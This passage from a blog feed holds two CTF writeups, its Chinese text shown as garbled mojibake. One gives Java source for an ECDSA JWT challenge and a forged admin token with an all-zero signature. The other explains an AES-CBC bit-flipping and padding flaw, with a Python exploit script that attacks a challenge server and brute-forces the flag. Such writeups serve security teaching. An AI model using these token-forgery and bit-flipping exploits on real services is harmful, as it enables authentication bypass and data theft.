Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initSign(privateKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="type">byte</span>[] sig = signature.sign();</span><br><span class="line">        <span class="keyword">return</span> sig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(<span class="type">byte</span>[] sig, <span class="type">byte</span>[] str ,ECPublicKey publicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signature</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA384withECDSAinP1363Format&quot;</span>);</span><br><span class="line">        signature.initVerify(publicKey);</span><br><span class="line">        signature.update(str);</span><br><span class="line">        <span class="keyword">return</span> signature.verify(sig);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jwt</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">EXPIRE</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">ECDSA</span> <span class="variable">ecdsa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ECDSA</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(String user, ECPrivateKey ecPrivateKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">header</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        header.put(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;myES&quot;</span>);</span><br><span class="line">        header.put(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(header.toJSONString().getBytes());</span><br><span class="line">        payload.put(<span class="string">&quot;iss&quot;</span>, <span class="string">&quot;qwb&quot;</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;exp&quot;</span>, System.currentTimeMillis() + EXPIRE * <span class="number">1000</span>);</span><br><span class="line">        payload.put(<span class="string">&quot;name&quot;</span>, user);</span><br><span class="line">        payload.put(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(payload.toJSONString().getBytes());</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">        <span class="type">byte</span>[] sig = ecdsa.sign(content.getBytes(), ecPrivateKey);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> Base64.getUrlEncoder().encodeToString(sig);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, content, sigB64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String token, ECPublicKey ecPublicKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] parts = token.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (parts.length != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">headerB64</span> <span class="operator">=</span> parts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> parts[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">sigB64</span> <span class="operator">=</span> parts[<span class="number">2</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s.%s&quot;</span>, headerB64, payloadB64);</span><br><span class="line">            <span class="type">byte</span>[] sig = Base64.getUrlDecoder().decode(sigB64);</span><br><span class="line">            <span class="keyword">return</span> ecdsa.verify(sig, content.getBytes(), ecPublicKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkAdmin</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span>(verify(token, ecPublicKey)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadB64</span> <span class="operator">=</span> token.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="type">String</span> <span class="variable">payloadDecodeString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">        System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ecdsa.keyGen();</span><br><span class="line">        <span class="type">ECPrivateKey</span> <span class="variable">ecPrivateKey</span> <span class="operator">=</span> (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">ECPublicKey</span> <span class="variable">ecPublicKey</span> <span class="operator">=</span> (ECPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">String</span> <span class="variable">menu</span> <span class="operator">=</span> <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            System.out.print(menu);</span><br><span class="line">            choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> generateToken(user, ecPrivateKey);</span><br><span class="line">                System.out.println(token);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> getFlag(token, ecPublicKey, user);</span><br><span class="line">                System.out.println(flag);</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        task();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiV2Fua2tvIFJlZSIsImFkbWluIjp0cnVlLCJleHAiOjE3NTkzMjEzMjg0Mzh9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h2&gt;&lt;p&gt;ECDSAä»£è¡¨æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼Œä¸æ—§çš„RS</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>GoGoCrypto_writeup</title>
    <link href="http://example.com/2023/12/27/GoGoCrypto-writeup/"/>
    <id>http://example.com/2023/12/27/GoGoCrypto-writeup/</id>
    <published>2023-12-26T16:10:28.000Z</published>
    <updated>2023-12-27T07:39:37.663Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>æœ¬äººå‚ä¸æå®¢å¤§æŒ‘æˆ˜2023çš„å‡ºé¢˜å·¥ä½œï¼Œä¸»è¦è´Ÿè´£å¯†ç å­¦æ¿å—ã€‚</p><p>å¯¹äºGoGoCryptoè¿™é“åå“æ¯”è¾ƒé«˜çš„é¢˜ç›®ï¼Œè¿™é‡Œé™„ä¸Šé¢˜è§£ã€‚</p><p><a href="https://github.com/AL3XEI709/Geek23/blob/main/GoGoCrypto/GoGoCrypto_setup.zip">é¢˜ç›®æºç </a></p><p>è¿™é¢˜ç”¨Golangå†™äº†ä¸€ä¸ªFlag Folderçš„äº¤äº’ï¼Œæµç¨‹å¤§æ¦‚é•¿è¿™æ ·ï¼š</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270044077.png" alt="image-20231227004357980"></p><p>åŠ è§£å¯†é‡‡ç”¨çš„ç®—æ³•æ˜¯AESçš„CBC modã€‚</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270045335.png" alt="image-20231227004502286"></p><p>è¿™ç§åŠ å¯†ç®—æ³•çš„ä¸»è¦æ”»å‡»æ‰‹æ®µæ˜¯<strong>å­—èŠ‚ç¿»è½¬ï¼ˆbit flippingï¼‰</strong>ï¼Œè¿™ç§æ”»å‡»çš„å‰ææ˜¯ä¸€ä¸ªæ˜æ–‡åˆ†ç»„æ˜¯å·²çŸ¥çš„ã€‚</p><p>sidæ˜¯16å­—èŠ‚ï¼Œæ ¹æ®å¡«å……ç®—æ³•ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := aes.BlockSize - (<span class="built_in">len</span>(pt) % aes.BlockSize)</span><br><span class="line">padding := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padlen)&#125;, padlen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(pt, padding...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“å¡«å……åæœ‰ä¸¤å—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block#1 block#2</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| sid | Padding (&quot;\x10&quot;*16) |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ä¿®æ”¹ç¬¬ä¸€ä¸ªå¯†æ–‡åˆ†ç»„ï¼Œæ¥æ§åˆ¶è§£å¯†åçš„ç¬¬</p><p>äºŒä¸ªæ˜æ–‡åˆ†ç»„ã€‚å…·ä½“çš„åŸç†æ˜¯ï¼š</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270047773.png" alt="image-20231227004700688"></p><p>è¿™ä¸€æ­¥æ˜¾ç„¶ä¼šç ´åç¬¬ä¸€å—çš„æ˜æ–‡ï¼Œä½†å¹¶ä¸å½±å“æˆ‘ä»¬çš„åˆ©ç”¨ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unpad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := <span class="type">int</span>(pt[<span class="built_in">len</span>(pt)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">return</span> pt[:<span class="built_in">len</span>(pt)-padlen]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unpadå‡½æ•°åªæ˜¯å°†paddingçš„æœ€åä¸€ä¸ªå­—èŠ‚ä½œä¸ºpaddingé•¿åº¦ï¼Œæ ¹æœ¬ä¸æ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„è®©paddingé•¿åº¦ä¸ºlen(plaintext) - 1ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æ˜æ–‡äº†ï¼</p><p>å› æ­¤æ”»å‡»æµç¨‹æ˜¯ï¼š</p><ul><li><p>ä¿®æ”¹å¯†æ–‡å¹¶ä¸Šä¼ </p></li><li><p>æœåŠ¡ç«¯è§£å¯†ï¼Œå¾—åˆ°åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æ˜æ–‡</p></li><li><p>éå†æ‰€æœ‰æ˜æ–‡ï¼ˆ254ï¼‰ï¼Œå¿…ç„¶å¾—åˆ°flagã€‚</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec, b64encode <span class="keyword">as</span> enc </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_request</span>(<span class="params">url, method=<span class="string">&#x27;GET&#x27;</span>, headers=<span class="literal">None</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method.upper() == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            response = requests.put(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            response = requests.delete(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unsupported HTTP method&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">url = <span class="string">&#x27;http://47.109.106.62:7842/&#x27;</span> </span><br><span class="line">response = requests.get(url) </span><br><span class="line">x = <span class="built_in">str</span>(response.headers)</span><br><span class="line"></span><br><span class="line">token = unquote(x.split(<span class="string">&quot;token&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line">token = dec(token) </span><br><span class="line">nonce = unquote(x.split(<span class="string">&quot;nonce&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">c1, c2 = token[:<span class="built_in">len</span>(token)//<span class="number">2</span>], token[<span class="built_in">len</span>(token)//<span class="number">2</span>:] </span><br><span class="line">c1 = xor(xor(c1,<span class="string">b&#x27;\x10&#x27;</span>*<span class="number">16</span>),<span class="string">b&#x27;\x1f&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">form_data = &#123;</span><br><span class="line">    <span class="string">&quot;Rec&quot;</span>: enc(c1+c2).decode()</span><br><span class="line">&#125;</span><br><span class="line">res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/dec&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data) </span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: enc(<span class="built_in">chr</span>(i).encode()).decode()+enc(sha512(dec(nonce)).digest()).decode()</span><br><span class="line">    &#125;</span><br><span class="line">    res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/check&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SYC&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">        <span class="built_in">print</span>(res) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment"># &#123;&quot;check&quot;:&quot;true&quot;,&quot;msg&quot;:&quot;Your flag is: SYC&#123;AL3XEI_FAKE_FLAG&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;æœ¬äººå‚ä¸æå®¢å¤§æŒ‘æˆ˜2023çš„å‡ºé¢˜å·¥ä½œï¼Œä¸»è¦è´Ÿè´£å¯†ç å­¦æ¿å—ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºGoGoCryptoè¿™é“åå“æ¯”è¾ƒé«˜çš„é¢˜ç›®ï¼Œè¿™é‡Œé™„ä¸Šé¢˜è§£ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
